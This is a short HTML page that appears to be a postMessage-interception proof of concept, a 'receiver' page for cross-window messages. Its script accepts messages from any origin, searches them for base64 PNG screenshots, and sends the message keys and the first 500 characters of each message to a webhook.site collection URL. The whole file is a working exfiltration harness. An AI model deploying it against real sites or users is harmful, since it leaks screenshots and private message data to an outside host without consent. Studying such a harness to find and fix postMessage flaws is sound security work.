<!DOCTYPE html>
<html>
  <body>
    <h1>Receiver Loaded</h1>
    <script>
      const webhookURL = "https://webhook.site/46a78561-fda0-49fc-af64-9d7229854322"; // Replace

      function deepFindScreenshot(obj) {
        const str = JSON.stringify(obj);
        const match = str.match(/data:image\/png;base64,[A-Za-z0-9+/=]+/);
        return match ? match[0] : null;
      }

      window.addEventListener("message", (e) => {
        try {
          const data = e.data;
          const screenshot = deepFindScreenshot(data);
          const keys = Object.keys(data || {});

          // Immediately send it to webhook
          fetch(webhookURL, {
            method: "POST",
            mode: "no-cors",
            body: JSON.stringify({
              receivedAt: new Date().toISOString(),
              messageKeys: keys,
              containsScreenshot: !!screenshot,
              truncatedMessage: JSON.stringify(data).slice(0, 500)
            })
          });

          // Add lightweight alert for visibility
          alert("üì• Message received:\n" + keys.join(", "));

          // Do NOT render image in DOM (avoid crash)

        } catch (err) {
          console.error("‚ö†Ô∏è Error processing message:", err);
        }
      }, false);
    </script>
  </body>
</html>
